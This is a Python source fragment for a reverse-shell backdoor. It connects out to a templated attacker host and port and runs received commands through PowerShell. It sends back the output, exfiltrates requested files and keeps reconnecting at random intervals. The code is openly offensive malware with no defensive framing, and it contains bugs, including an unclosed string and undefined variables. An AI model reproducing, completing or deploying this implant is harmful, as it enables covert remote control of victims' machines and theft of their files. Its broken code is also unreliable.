def wrapper():
    connected = False
    def transfer(s, path):
        if os.path.exists(path):
            f = open(path, 'rb')
            packet = f.read(1024)
            while len(packet) > 0:
                s.send(packet)
                packet = f.read(1024)
            s.send('DONE'.encode())
        else:
            s.send('File not found'.encode())
    def connect():
        try:
            target_host = <<HOST>>
            target_port = <<PORT>>
            client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            #client.settimeout(<<SESSION_TIMEOUT>>)
            client.connect((target_host,target_port))
            connected = True
            while True:
                data = client.recv(1024)
                if not data:
                    connected = False 
                    break
                if data.decode().replace(' ', '').encode() == b'\n':
                    print("line break")
                    continue
                if data[:2].decode() == 'cd':
                    os.chdir(data[3:].decode())
                elif data[:9].decode() == '<download':
                    grab, path, dst = data.decode().split("::")
                    transfer(client, path)
                elif '<upload' in data_:
                    while 'EOF_EOF' not in data:
                        resp = conn.recv(1024)
                        with open("test.txt", "wb) as f:
                            f.write(resp)
                elif len(data) > 0:
                    cmd = subprocess.Popen(["powershell.exe", data.decode()], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read()
                    output_str = str(output_bytes, "utf-8")
                    client.send(str.encode(output_str + str(os.getcwd()) + '>'))
            client.close()
        except Exception as err:
            print(err)
    while True:
        if connected:
            continue
        else:
            sleep_for = random.randrange(1, 5)
            time.sleep(int(sleep_for))
            try:
                connect()
            except:
                pass